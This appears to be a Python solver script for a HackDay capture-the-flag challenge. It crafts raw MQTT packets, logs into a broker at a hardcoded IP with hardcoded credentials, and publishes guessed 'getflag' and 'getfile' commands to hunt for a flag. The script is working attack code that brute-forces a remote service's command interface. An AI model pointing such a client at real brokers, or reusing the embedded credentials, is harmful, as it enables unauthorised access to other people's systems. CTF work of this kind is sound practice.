import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_publish(topic, message):
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    fixed_header = b'\x30'
    if rem_len < 128: fixed_header += bytes([rem_len])
    else: fixed_header += bytes([(rem_len & 0x7F) | 0x80, rem_len >> 7])
    return fixed_header + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("text-solver-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    s.sendall(mqtt_subscribe("response/#", 6001))
    s.sendall(mqtt_subscribe("register/#", 6002))
    
    cmds = [
        "help",
        "usage",
        "register solver_bot",
        "getflag Nobody like mosquitoes",
        "getflag \"Nobody like mosquitoes\"",
        "getflag Nobody_like_mosquitoes",
        "getflag 19991231",
        "getflag 20000101",
        "getflag 946684800",
        "getfile flag.txt 31f0617ffd45fbba6323b10b5b5a7cc5 response/text_flag",
        "getflag 946684800 42093d9b \"Nobody like mosquitoes\" response/text_flag"
    ]
    
    for cmd in cmds:
        print(f"[*] Sending text: {cmd}")
        s.sendall(mqtt_publish("ctf/hackday", cmd))
        time.sleep(0.5)

    start_time = time.time()
    try:
        while time.time() - start_time < 30:
            data = s.recv(4096)
            if not data: break
            try:
                decoded = data.decode(errors='ignore')
                print(f"[*] Text: {decoded}")
                if "HACKDAY{" in decoded:
                    print("[!!!] FLAG FOUND [!!!]")
                    # Try to parse the text carefully
                    match = re.search(r"HACKDAY\{.*?\}", decoded)
                    if match:
                        print(f"FLAG: {match.group(0)}")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    import re
    solve()
